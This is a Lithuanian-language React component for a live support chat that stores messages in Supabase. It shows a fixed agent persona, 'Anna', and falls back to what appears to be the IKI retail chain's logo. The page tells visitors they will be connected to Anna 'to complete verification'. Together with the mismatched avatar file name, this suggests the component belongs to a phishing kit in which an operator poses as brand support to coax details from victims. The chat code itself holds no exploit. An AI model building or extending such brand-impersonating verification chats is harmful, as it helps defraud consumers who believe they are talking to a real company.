"use client";

import { useEffect, useState, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { Linkify } from "@/components/ui/Linkify";

type ChatMessage = {
  id: string;
  session_id: string;
  sender: "user" | "admin";
  content: string;
  image_url?: string | null;
  created_at: string;
};

const SUPPORT_AVATAR = "/avatars/support-sarah.webp";
const SUPPORT_NAME = "Anna";
const SUPPORT_ROLE = "Klientų aptarnavimas";
const TEXT_NO_MESSAGES = "Nėra žinučių. Kaip galime jums padėti?";
const TEXT_INPUT_PLACEHOLDER = "Rašyti žinutę...";
const TEXT_CLOSE = "Uždaryti";

export function LiveSupportClient({ sessionId }: { sessionId: string }) {
  const { settings, loading: settingsLoading } = useSettings();
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const [sending, setSending] = useState(false);
  const supabase = createBrowserSupabaseClient();
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (isChatOpen) {
      messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
    }
  }, [isChatOpen, messages]);

  useEffect(() => {
    if (!supabase || !sessionId || !isChatOpen) return;

    const loadChat = () => {
      supabase
        .from("chat_messages")
        .select("id,session_id,sender,content,image_url,created_at")
        .eq("session_id", sessionId)
        .order("created_at", { ascending: true })
        .limit(50)
        .then(({ data, error }) => {
          if (error) {
            console.error("chat load error:", error);
            return;
          }
          if (data) {
            setMessages((prev) => {
              if (prev.length !== data.length) {
                setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
                return data as ChatMessage[];
              }
              return prev;
            });
          }
        });
    };

    loadChat();
    const interval = setInterval(loadChat, 2000);

    const channel = supabase
      .channel(`chat:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "chat_messages",
          filter: `session_id=eq.${sessionId}`,
        },
        (payload) => {
          const newMsg = payload.new as ChatMessage;
          setMessages((prev) => {
            if (!prev.find(m => m.id === newMsg.id)) {
              return [...prev, newMsg];
            }
            return prev;
          });
          setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      void supabase.removeChannel(channel);
    };
  }, [isChatOpen, sessionId, supabase]);

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newMessage.trim() || !supabase || !sessionId || sending) return;

    const msg = newMessage.trim();
    setSending(true);
    setNewMessage("");

    const { data, error } = await supabase
      .from("chat_messages")
      .insert({
        session_id: sessionId,
        sender: "user",
        content: msg,
      })
      .select("id,session_id,sender,content,image_url,created_at")
      .single();

    setSending(false);

    if (error) {
      console.error("chat send error:", error);
      setNewMessage(msg);
      return;
    }

    if (data) {
      setMessages((prev) => {
        if (prev.find((m) => m.id === data.id)) return prev;
        return [...prev, data as ChatMessage];
      });
    }
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  return (
    <>
      <div className="pak-page-shell">
        {!isChatOpen ? (
          <div className="pak-form-card fade-in relative z-10 w-full max-w-[560px]">
            <div className="pak-form-inner flex flex-col items-center px-4 py-4 text-center sm:px-7 sm:py-6">
              <div className="mb-4 flex w-full items-start justify-between gap-3">
                <div className="max-w-[18rem] text-left">
                  <h2 className="pak-form-title">{settings.live_support_title}</h2>
                  <p className="pak-form-subtitle mt-2 whitespace-pre-line">
                    <Linkify text={settings.live_support_subtitle} />
                  </p>
                </div>
                <img
                  src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              <div className="mb-4 flex w-full items-center gap-3 rounded-[1.2rem] border border-[#4ade80]/30 bg-[linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.02))] px-3.5 py-3 text-left sm:px-4 sm:py-3.5">
                <div className="relative shrink-0">
                  <img
                    src={SUPPORT_AVATAR}
                    alt={SUPPORT_NAME}
                    className="size-12 rounded-full border-2 border-[#4ade80]/85 object-cover sm:size-14"
                  />
                  <span className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#021a0e] bg-[#5ef08c]" />
                </div>
                <div className="min-w-0 flex-1">
                  <p className="text-[0.68rem] font-black uppercase tracking-[0.22em] text-[#4ade80]">Pagalbos tarnyba</p>
                  <h3 className="truncate text-base font-extrabold text-white sm:text-lg">{SUPPORT_NAME}</h3>
                  <p className="text-[13px] text-white/66">{SUPPORT_ROLE}</p>
                </div>
              </div>

              <div className="mb-4 w-full max-w-[430px] rounded-[1.05rem] border border-[#4ade80]/20 bg-black/25 px-3.5 py-3">
                <div className="mb-2 flex items-center justify-center gap-2 text-[#4ade80]">
                  <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                  </svg>
                  <span className="text-[0.72rem] font-black uppercase tracking-[0.22em]">Tiesioginė pagalba</span>
                </div>
                <p className="text-sm font-semibold leading-5 text-white/86">
                  Būsite tiesiogiai sujungti su <span className="text-[#4ade80]">{SUPPORT_NAME}</span>, kad užbaigtumėte patvirtinimą.
                </p>
              </div>

              <button
                onClick={() => setIsChatOpen(true)}
                className="pak-form-button flex h-14 w-full max-w-[320px] items-center justify-center gap-2 px-5 text-[15px] sm:h-[3.7rem] sm:text-base"
              >
                <span>{settings.live_support_button}</span>
                <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 12h14m-4-4 4 4-4 4" />
                </svg>
              </button>

              <div className="mt-4 pak-form-security justify-center border-t border-[#4ade80]/15 pt-3 text-center">
                <svg className="h-6 w-6 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span>Saugus tiesioginis pokalbis su sinchronizacija realiu laiku.</span>
              </div>
            </div>
          </div>
        ) : (
          <div className="pak-form-card animate-in zoom-in-95 relative z-10 flex h-[76vh] max-h-[680px] w-full max-w-[700px] flex-col overflow-hidden duration-300">
            <div className="pak-form-inner flex items-center justify-between border-b border-[#4ade80]/18 bg-[linear-gradient(180deg,rgba(255,255,255,0.08),rgba(255,255,255,0.03))] px-4 py-4 sm:px-6">
              <div className="flex items-center gap-4">
                <div className="relative">
                  <img
                    src={SUPPORT_AVATAR}
                    alt={SUPPORT_NAME}
                    className="size-12 rounded-full border-2 border-[#4ade80]/85 object-cover shadow-sm"
                  />
                  <div className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#021a0e] bg-green-500"></div>
                </div>
                <div className="flex flex-col">
                  <h3 className="text-[16px] font-bold leading-tight text-white">{SUPPORT_NAME}</h3>
                  <span className="text-[13px] text-white/62">{SUPPORT_ROLE}</span>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <img
                  src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="h-11 w-11 shrink-0 object-contain"
                />
                <button onClick={() => setIsChatOpen(false)} title={TEXT_CLOSE} className="flex size-10 items-center justify-center rounded-full border border-[#4ade80]/18 bg-white/8 text-white/72 shadow-sm transition-colors hover:bg-white/14 hover:text-white">
                  <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto bg-transparent p-4 custom-scrollbar sm:p-5">
              {messages.length === 0 ? (
                <div className="flex h-full flex-col items-center justify-center text-center opacity-70">
                  <svg className="mb-3 size-12 text-[#4ade80]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                  </svg>
                  <p className="text-sm text-white/72">{TEXT_NO_MESSAGES}</p>
                </div>
              ) : (
                <div className="space-y-4">
                {messages.map((m) => (
                  <div key={m.id} className={`flex ${m.sender === "user" ? "justify-end" : "justify-start"}`}>
                    <div className={`max-w-[85%] rounded-2xl px-4 py-3 text-[15px] shadow-sm sm:max-w-[80%] ${m.sender === "user" ? "rounded-br-sm border border-[#4ade80]/55 bg-[linear-gradient(180deg,#4ade80_0%,#4ade80_100%)] text-[#03240f] shadow-[0_10px_24px_rgba(74,222,128,0.22)]" : "rounded-bl-sm border border-[#4ade80]/18 bg-white/10 text-white backdrop-blur-md"}`}>
                      {m.image_url && (
                        <div
                          className="mb-3 overflow-hidden rounded-xl cursor-pointer hover:opacity-90 transition-opacity"
                          onClick={() => setZoomedImage(m.image_url!)}
                        >
                          <img src={m.image_url} alt="Chat Attachment" className="max-h-52 w-full object-cover rounded-xl" />
                        </div>
                      )}
                      {m.content && <p className="leading-relaxed">{m.content}</p>}
                    </div>
                  </div>
                ))}
                </div>
              )}
              <div ref={messagesEndRef} />
            </div>

            <form onSubmit={sendMessage} className="flex items-center gap-3 border-t border-[#4ade80]/18 bg-white/5 p-4 backdrop-blur-md">
              <input
                type="text"
                value={newMessage}
                onChange={(e) => setNewMessage(e.target.value)}
                placeholder={TEXT_INPUT_PLACEHOLDER}
                className="flex-1 rounded-xl border border-[#4ade80]/14 bg-white/8 px-5 py-4 text-[15px] text-white outline-none placeholder:text-white/35 transition-all shadow-sm focus:border-[#4ade80]/60 focus:bg-white/12"
              />
              <button type="submit" disabled={!newMessage.trim() || sending || !sessionId} className="flex size-14 shrink-0 items-center justify-center rounded-xl border border-[#4ade80]/60 bg-[linear-gradient(180deg,#4ade80_0%,#4ade80_100%)] text-[#03240f] transition-all active:scale-95 disabled:opacity-50 disabled:grayscale shadow-[0_10px_24px_rgba(74,222,128,0.25)] hover:brightness-105">
                <svg className="ml-1 size-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
                </svg>
              </button>
            </form>
          </div>
        )}
      </div>

      {zoomedImage && (
        <div 
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/90 p-4 backdrop-blur-sm animate-in fade-in duration-200" 
          onClick={() => setZoomedImage(null)}
        >
          <button 
            className="absolute top-4 right-4 sm:top-8 sm:right-8 text-white/70 hover:text-white p-2" 
            onClick={() => setZoomedImage(null)}
          >
            <svg className="size-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <img 
            src={zoomedImage} 
            alt="Zoomed" 
            className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
    </>
  );
}
